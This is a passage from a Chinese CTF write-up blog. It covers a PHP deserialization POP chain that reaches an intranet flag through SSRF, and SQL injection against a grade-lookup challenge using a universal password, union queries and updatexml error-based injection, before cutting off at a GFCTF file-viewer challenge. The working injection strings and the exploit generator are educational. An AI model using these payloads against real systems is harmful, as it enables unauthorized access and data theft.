class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=.</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313211955346.png" alt="image-20240313211955346"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://arsenetang.com/2021/11/24/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%902021%20GFCTF%E4%B8%AD%E7%9A%84%E4%B8%A4%E9%81%93Web/#2-ez-calc">WP篇之解析2021 GFCTF中的两道Web</a></p>
<h1 id="swpuctf-2022-新生赛power">[SWPUCTF 2022 新生赛]Power!</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313212144086.png" alt="image-20240313212144086"></p>
<p>看到hint说给source传参，猜测是查看文件。</p>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileViewer</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$black_list</span> = <span class="hljs-string">"flag"</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$local</span> = <span class="hljs-string">"http://127.0.0.1/"</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$a</span></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadfile</span>();
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadfile</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;path)){
                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/"</span>.<span class="hljs-variable">$this</span>-&gt;black_list.<span class="hljs-string">"/i"</span>,<span class="hljs-variable">$this</span>-&gt;path)){
                    <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-string">"cheems.jpg"</span>);
                }<span class="hljs-keyword">else</span>{
                    <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-variable">$this</span>-&gt;path);
                }
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-string">"cheems.jpg"</span>);
            }
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file</span>).<span class="hljs-string">'"/&gt;'</span>;
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>{
            <span class="hljs-variable">$url</span> = <span class="hljs-variable">$path</span>;
            <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
            <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);
            <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;local = <span class="hljs-string">"http://127.0.0.1/"</span>;
        }
    }
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$superhacker</span> = <span class="hljs-string">"hacker.jpg"</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goodman</span>(<span class="hljs-params"><span class="hljs-variable">$i</span>,<span class="hljs-variable">$j</span></span>)</span>{
            <span class="hljs-variable">$i</span>-&gt;<span class="hljs-variable">$j</span> = <span class="hljs-variable language_">$this</span>-&gt;superhacker;
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">goodman</span>(<span class="hljs-variable">$this</span>-&gt;a,<span class="hljs-variable">$this</span>-&gt;b);
            <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">c</span>();
        }
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'source'</span>])){
        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'image_path'</span>])){
            <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'image_path'</span>];    <span class="hljs-comment">//flag in /flag.php</span>
            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$path</span>)&amp;&amp;!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/http:|gopher:|glob:|php:/i"</span>,<span class="hljs-variable">$path</span>)){
                <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>)).<span class="hljs-string">'"/&gt;'</span>;
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"cheems.jpg"</span>)).<span class="hljs-string">'"/&gt;'</span>;
            }
            
        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'path_info'</span>])){
            <span class="hljs-variable">$path_info</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'path_info'</span>];
            <span class="hljs-variable">$FV</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$path_info</span>));
            <span class="hljs-variable">$FV</span>-&gt;<span class="hljs-title function_ invoke__">loadfile</span>();
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-variable">$path</span> = <span class="hljs-string">"vergil.jpg"</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;POWER!!&lt;/h2&gt;</span>
<span class="hljs-string">            &lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>)).<span class="hljs-string">'"/&gt;'</span>;
        }
    }
<span class="hljs-meta">?&gt;</span></code></pre>
<p>我们先看一下flag.php里面有什么，给image_path传参即可。如下所示，说flag在65500端口处</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-variable">$a</span> = <span class="hljs-string">"good job,but there is no flag</span>
<span class="hljs-string"></span>
<span class="hljs-string">i put my flag in intranet(127.0.0.1:65500)</span>
<span class="hljs-string"></span>
<span class="hljs-string">outsider have no permissions to get it</span>
<span class="hljs-string"></span>
<span class="hljs-string">if you want it,then you have to take it</span>
<span class="hljs-string"></span>
<span class="hljs-string">but you already knew the rules</span>
<span class="hljs-string"></span>
<span class="hljs-string">try it"</span>;

<span class="hljs-meta">?&gt;</span></code></pre>
<p>接下来就是找链子，不难找到<code>Backdoor.__destruct-》FileViewer.__call-》FileViewer.loadfile-》FileViewer::curl()</code></p>
<p>链子虽然不难找，但是我却又陷入了误区，不会做，首先先看下面的点（别的师傅强调的）</p>
<blockquote>
<p>当我们的反序列化正在执行的时候，会同时执行 $FV-&gt;loadfile();这个语句，但是$FV是Backdoor的对象，根本没有这个方法，所以会报错。那么就要让$FV是FileViewer的对象。</p>
</blockquote>
<p>按照我们设想，本来是想backdoor包含fileviewer类的，但是按照上述的tip，必须fileviwer类包含backdoor才行。</p>
<p>然后问了GPT发现反序列化顺序是先反序列化外部类，后反序列化内部类。这样的话就说通了：先上链子</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileViewer</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$black_list</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$local</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>  = <span class="hljs-string">"flag"</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$superhacker</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();
        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">"local"</span>;
        <span class="hljs-variable language_">$this</span>-&gt;superhacker = <span class="hljs-string">"http://127.0.0.1:65500/"</span>;
    }
}
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();
<span class="hljs-variable">$b</span>-&gt;local = <span class="hljs-variable">$a</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));</code></pre>
<p>首先外部类为FileViewer，因此反序列化的时候会首先调用FileViewer类中的wakeup方法，导致local参数内容被修改。但我们注意到backdoor类中的goodman可以修改类的属性，那就可以将backdoor类中的a参数赋值为FileViewer，b赋值为local，$superhacker赋值为<code>http://127.0.0.1:65500/</code>，这样经过goodman的话就是：</p>
<p>FileViewer-&gt;local = <code>http://127.0.0.1:65500</code>，达到效果。而这里我们需要让backdoor类被包含，那看了看参数只有local可以使用，我们令local为backdoor类对象，这样的话，反序列化先调用wakeup修改了local内容，但在脚本执行结束的时候，会自动调用析构函数来进行处理（GC回收机制）这样的话，我们又会重新调用FileViewer类对象中的call魔术方法，接着调用loadfile-》curl方法，导致最终的flag回显。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313215232524.png" alt="image-20240313215232524"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2022/10/2022-swpu-nss-%E6%96%B0%E7%94%9F%E8%B5%9B-web-writeup/#power">2022 SWPU NSS 新生赛 Web Writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62306641/article/details/135141582">[SWPUCTF 2022 新生赛]Power!</a></p>
<h1 id="swpuctf-2023-秋季新生赛查查need">[SWPUCTF 2023 秋季新生赛]查查need</h1>
<p>这道题也是被我惯性思维导致做不出来吧，这里题目提示说是尝试万能密码。那我们就需要找注入点，这里找了半天也没有效果。看了wp发现是思路太死板吧，我只进行了单引号的尝试，没想到这里是当输入双引号之后会产生报错。导致我错过了注入点。</p>
<h2 id="万能密码">万能密码</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240314182950844.png" alt></p>
<p>首先是一个成绩查询系统，这里根据马后炮我们在post传参出都添加双引号进行尝试，就会发现，当学号处输入双引号就会引发报错</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183045200.png" alt="image-20240314183045200"></p>
<p>很明显这里就是注入点了，结合万能密码的提示，那大概率就是这样构造：<code>222" or "1"="1"%23</code>这样就能永真了，而这里的姓名我们需要是正确的才行，很幸运，姓名这里右上角给了我们了，只需要写个脚本提取一下（为了不乱码我提取的时候url编码了）</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> openpyxl
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote

<span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_student_names</span>(<span class="hljs-params">file_path, output_file</span>):
    workbook = openpyxl.load_workbook(file_path)
    sheet = workbook.active

    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> sheet.iter_rows(values_only=<span class="hljs-literal">True</span>):
            student_name = row[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 假设学生姓名在第一列</span>
            <span class="hljs-keyword">if</span> student_name:
                student_name = quote(student_name)
                f.write(student_name + <span class="hljs-string">'\n'</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">'学生姓名提取完成！'</span>)

<span class="hljs-comment"># 调用示例</span>
xlsx_file = <span class="hljs-string">'文件地址'</span>  <span class="hljs-comment"># 替换为您的文件路径</span>
output_txt = <span class="hljs-string">'student_names.txt'</span>  <span class="hljs-comment"># 替换为输出文件的路径</span>

extract_student_names(xlsx_file, output_txt)</code></pre>
<p>效果如下：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183312073.png" alt="image-20240314183312073"></p>
<p>接着bp抓包进行爆破，而想到爆破的原因在于这下图，可以看到显示出来的是成绩，而不是什么敏感信息，这里我也是猜测，如果都爆破一遍，一定有一个学生的结果会不一样。结果也告诉我，我的思路是正确的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183343645.png" alt="image-20240314183343645"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183433797.png" alt="image-20240314183433797"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183440690.png" alt="image-20240314183440690"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183457120.png" alt="image-20240314183457120"></p>
<p>爆破完之后查看长度，发现有flag泄露。但事后看了wp发现还可以用常规的联合注入得到，并且其中的姿势我也是第一次见到（当然也可以采用报错注入）这里就学习一下联合注入了</p>
<h2 id="联合注入">联合注入</h2>
<p>首先常规联合注入发现存在5列数据，接下来的联合注入就出问题了</p>
<pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>" union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185849430.png" alt="image-20240314185849430"></p>
<p>可以看到页面并没有显示出回显位，这里我也没见过这种情况，看了师傅解释是这样的</p>
<pre><code class="hljs scss">问题来了，当我按正常联合注入流程测的时候发现它说查无此人或密码错误，我们输入的name是<span class="hljs-number">1</span>，联合注入查到的数据是<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>，<span class="hljs-number">4</span>，<span class="hljs-number">5</span>
从前端显示的结果来看很显然name并不是第一个字段，不断测试，测出name字段位</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314190750425.png" alt="image-20240314190750425"></p>
<p>当把第二个字段设为1的时候就判断正确了，说明第二个字段是name，然后回显的成绩是5，说明第五个字段是成绩</p>
<p>由此可以判断后端的处理逻辑</p>
<blockquote>
<p>（mysql查完数据后取查到数据的name字段值和用户输入的name值进行判断，如果name判断成功，然后回显<br>
这里用联合注入使查到的name值为1，我们前端输入的name值也是1，两者相等，就判断成功了）</p>
</blockquote>
<p>这里常规查库，当查到表名的时候又出现问题了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314190933860.png" alt="image-20240314190933860"></p>
<p>报错显示字符集不匹配，那就让它匹配，collate 子句将字符集转换为一致的形式，一般字符集的话都是utf8</p>
<pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>" union select <span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-built_in">group_concat</span>(table_name)collate utf8_general_ci from information_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-built_in">database</span>()--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314191047978.png" alt="image-20240314191047978"></p>
<p>发现成功，之后就是常规思路了，不赘述了</p>
<h2 id="报错注入">报错注入</h2>
<pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>"and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314184826656.png" alt="image-20240314184826656"></p>
<pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>"and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(table_name)from information_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-built_in">database</span>()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314184936138.png" alt="image-20240314184936138"></p>
<pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>"and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(column_name)from information_schema<span class="hljs-selector-class">.columns</span> where table_name='students'),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185055756.png" alt="image-20240314185055756"></p>
<p>到了这里就会尴尬掉，因为找了所有的列都没有flag，这里看师傅如何解释的</p>
<pre><code class="hljs scss">应该是查到的数据太多了，没有全部回显出来，然后回显出来的数据中也没有flag。
出题人应该是把flag放在表的最后了，冷静，冷静，flag是很长的，因此我们只需要找到某一列最大的那个数据就可以了，这里用MAX函数获取指定列中的最大值</code></pre>
<p>这样的话就可以这样构造，至于完整回显，用mid、substr都可，不再赘述</p>
<pre><code class="hljs scss">name=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;student_id=<span class="hljs-number">1</span>"and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select MAX(grade)from students),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185404845.png" alt="image-20240314185404845"></p>
<h1 id="gfctf-2021文件查看器">[GFCTF 2021]文件查看器</h1>
<p>给出一个登录页面，直接尝试弱密码admin:admin登录成功，之后是一个文件查看器。我们直接查看相关文件，审计代码</p>
<p>index.php</p>
<pre><code class="hljs scss">&lt;?php
    function <span class="hljs-built_in">__autoload</span>($className) {
        <span class="hljs-built_in">include</span>("class/".$className.".class.php");
    }

    <span class="hljs-built_in">if</span>(!isset($_GET['c'])){
        <span class="hljs-selector-tag">header</span>("location:./?c=User&amp;m=login");
    }else{
        <span class="hljs-variable">$c</span>=$_GET<span class="hljs-selector-attr">[<span class="hljs-string">'c'</span>]</span>;
        <span class="hljs-variable">$class</span>=new <span class="hljs-variable">$c</span>();
        <span class="hljs-built_in">if</span>(isset($_GET['m'])){
            <span class="hljs-variable">$m</span>=$_GET<span class="hljs-selector-attr">[<span class="hljs-string">'m'</span>]</span>;
            <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$m</span>();
        }
    }</code></pre>
